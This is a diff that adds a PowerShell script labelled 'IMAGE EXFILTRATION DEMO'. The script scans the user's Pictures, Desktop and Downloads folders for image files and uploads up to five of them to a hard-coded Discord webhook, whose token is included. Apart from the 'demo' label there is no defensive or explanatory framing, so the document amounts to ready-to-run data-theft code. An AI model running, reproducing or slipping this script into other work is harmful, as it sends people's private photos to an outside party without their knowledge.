@@ -1,0 +1,16 @@
+powershell
+Write-Host '=========================================' -ForegroundColor Cyan
+Write-Host '   IMAGE EXFILTRATION DEMO' -ForegroundColor Yellow
+Write-Host '=========================================' -ForegroundColor Cyan
+
+$webhook='https://discord.com/api/webhooks/1530827985119088745/q5uT6bwcAFbi6YAn4QvkT6WuQORBA8IjLlE48IRTAMCFusFmBEL1pSKHR47eQbNkpfPL'
+
+$upload={param($f,$w); $n=Split-Path $f -Leaf; $b=[Guid]::NewGuid().ToString(); $c=[IO.File]::ReadAllBytes($f); $e=[Text.Encoding]::GetEncoding('iso-8859-1'); $fc=$e.GetString($c); $bd=@(); $bd+="--$b"; $bd+="Content-Disposition: form-data; name=`"file`"; filename=`"$n`""; $bd+="Content-Type: application/octet-stream"; $bd+=""; $bd+=$fc; $bd+="--$b--"; $bt=$bd -join "`r`n"; $ct="multipart/form-data; boundary=$b"; Invoke-RestMethod -Uri $w -Method Post -Body $bt -ContentType $ct}
+
+$paths=@("$env:USERPROFILE/Pictures","$env:USERPROFILE/Desktop","$env:USERPROFILE/Downloads")
+
+$count=0; $maxFiles=5
+
+Write-Host '[+] Scanning for images...' -ForegroundColor Green
+
+foreach($p in $paths){if($count -ge $maxFiles){break}; if(Test-Path $p){Get-ChildItem -Path $p -Recurse -Include @('*.jpg','*.jpeg','*.png','*.gif','*.bmp') -ErrorAction SilentlyContinue | Select-Object -First $maxFiles | foreach{if($count -ge $maxFiles){return}; $count++; Write-Host "[+] Uploading ($count/$maxFiles): $($_.Name)" -ForegroundColor Gray; try{& $upload -f $_.FullName -w $webhook; Write-Host "   Done!" -ForegroundColor Green}catch{Write-Host "   Failed: $_" -ForegroundColor Red}}}}
